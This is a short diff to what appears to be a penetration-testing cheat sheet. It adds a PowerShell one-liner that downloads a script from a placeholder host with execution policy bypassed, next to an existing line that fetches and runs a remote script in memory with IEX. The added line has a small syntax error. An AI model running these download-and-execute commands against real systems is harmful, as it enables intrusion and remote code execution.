@@ -54,4 +54,5 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 
 ```
 powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.ps1'.'savedpath')
 ```
